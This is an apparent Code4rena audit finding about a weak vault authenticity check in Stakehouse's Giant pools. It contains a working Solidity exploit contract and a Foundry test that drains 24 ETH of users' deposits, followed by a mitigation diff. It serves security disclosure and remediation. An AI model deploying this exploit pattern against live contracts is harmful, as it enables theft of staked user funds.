[H-17] Giant pools can be drained due to weak vault authenticity check
Submitted byJeiwan, also found byTrust,datapunk,immeas,JTJabba,arcoun,bin2chen,imare,wait,unforgiven,satoshipotato,ronnyx2017,Lambda,hihen,bitbopper,fs0c,banky,9svR6w,c7e7eff,perseverancesuccess,0xdeadbeef0x, andclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44
An attacker can withdraw all ETH staked by users in a Giant pool. BothGiantSavETHVaultPoolandGiantMevAndFeesPoolare affected.
Proof of Concept
ThebatchDepositETHForStakingfunction in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes (GiantSavETHVaultPool.sol#L48-L58):
SavETHVaultsavETHPool=SavETHVault(_savETHVaults[i]);require(liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),"Invalid liquid staking manager");// Deposit ETH for staking of BLS keysavETHPool.batchDepositETHForStaking{ value:transactionAmount}(_blsPublicKeys[i],_stakeAmounts[i]);
An attacker can pass an exploit contract as a vault. The exploit contract will implementliquidStakingManagerthat will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:
// test/foundry/GiantPools.t.solcontractGiantPoolExploit{addressimmutableowner=msg.sender;addressvalidStakingManager;constructor(addressvalidStakingManager_) {validStakingManager=validStakingManager_;}functionliquidStakingManager()publicviewreturns(address) {returnvalidStakingManager;}functionbatchDepositETHForStaking(bytes[]calldata/*_blsPublicKeyOfKnots*/,uint256[]calldata/*_amounts*/)externalpayable{payable(owner).transfer(address(this).balance);}}functiontestPoolDraining_AUDIT()public{// Register BLS keyaddressnodeRunner=accountOne;vm.deal(nodeRunner,12ether);registerSingleBLSPubKey(nodeRunner,blsPubKeyOne,accountFour);// Set up users and ETHaddresssavETHUser=accountThree;vm.deal(savETHUser,24ether);addressattacker=address(0x1337);vm.label(attacker,"attacker");vm.deal(attacker,1ether);// User deposits ETH into Giant savETHvm.prank(savETHUser);giantSavETHPool.depositETH{value:24ether}(24ether);assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser),24ether);assertEq(address(giantSavETHPool).balance,24ether);// Attacker deploys an exploit.vm.startPrank(attacker);GiantPoolExploitexploit=newGiantPoolExploit(address(manager));vm.stopPrank();// Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.bytes[][]memoryblsKeysForVaults=newbytes[][](1);blsKeysForVaults[0] =getBytesArrayFromBytes(blsPubKeyOne);uint256[][]memorystakeAmountsForVaults=newuint256[][](1);stakeAmountsForVaults[0] =getUint256ArrayFromValues(24ether);giantSavETHPool.batchDepositETHForStaking(getAddressArrayFromValues(address(exploit)),getUint256ArrayFromValues(24ether),blsKeysForVaults,stakeAmountsForVaults);// Vault got nothing.assertEq(address(manager.savETHVault()).balance,0ether);// Attacker has stolen user's deposit.assertEq(attacker.balance,25ether);}
Recommended Mitigation Steps
Consider taking a list ofLiquidStakingManageraddresses instead of vault addresses:
--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {/// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding/// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in fundingfunction batchDepositETHForStaking(-        address[] calldata _savETHVaults,+        address[] calldata _liquidStakingManagers,uint256[] calldata _ETHTransactionAmounts,bytes[][] calldata _blsPublicKeys,uint256[][] calldata _stakeAmounts) public {-        uint256 numOfSavETHVaults = _savETHVaults.length;+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;require(numOfSavETHVaults > 0, "Empty arrays");require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths");@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {// For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validatorfor (uint256 i; i < numOfSavETHVaults; ++i) {+            require(+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),+                "Invalid liquid staking manager"+            );+uint256 transactionAmount = _ETHTransactionAmounts[i];// As ETH is being deployed to a savETH pool vault, it is no longer idleidleETH -= transactionAmount;-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);-            require(-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),-                "Invalid liquid staking manager"-            );+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));+            SavETHVault savETHPool = liquidStakingManager.savETHVault();// Deposit ETH for staking of BLS keysavETHPool.batchDepositETHForStaking{ value: transactionAmount }(
vince0656 (Stakehouse) confirmed